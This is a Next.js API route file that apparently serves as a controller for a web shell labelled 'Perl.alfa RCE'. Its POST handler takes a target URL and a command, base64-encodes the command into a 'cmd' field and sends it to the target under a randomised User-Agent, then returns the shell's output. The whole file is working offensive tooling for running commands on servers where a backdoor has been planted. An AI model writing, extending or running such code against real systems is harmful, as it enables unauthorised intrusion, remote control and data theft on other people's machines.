import getUA, { getRandomUserAgent } from "@/utils/getUA";
import { NextResponse } from "next/server";

export const maxDuration = 60;
export const dynamic = "force-dynamic";

export async function POST(request) {
  const { target, command } = await request.json();
  let error = false;
  let message = "";
  let status = 200;

  if (!target || !command) {
    error = true;
    message = "All fields are required.";
    status = 400;
  }
  if (error) {
    return NextResponse.json(
      {
        success: false,
        error: message,
      },
      { status }
    );
  }

  const link = target.startsWith("https://") || target.startsWith("http://") ? target : `http://${target}`;
  try {
    const response = await fetch(link, {
      method: "POST",
      headers: {
        "User-Agent": getRandomUserAgent(getUA()),
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `cmd=${Buffer.from(command, "utf-8").toString("base64")}`,
    });
    const data = await response.text();
    return NextResponse.json(
      {
        success: true,
        message: "Command executed successfully",
        totalData: data.length,
        data,
      },
      { status: 200 }
    );
  } catch (error) {
    return NextResponse.json(
      {
        success: false,
        error: "Failed to execute command",
      },
      { status: 400 }
    );
  }
}

export async function GET() {
  return NextResponse.json({ tools: "Perl.alfa RCE" }, { status: 200 });
}
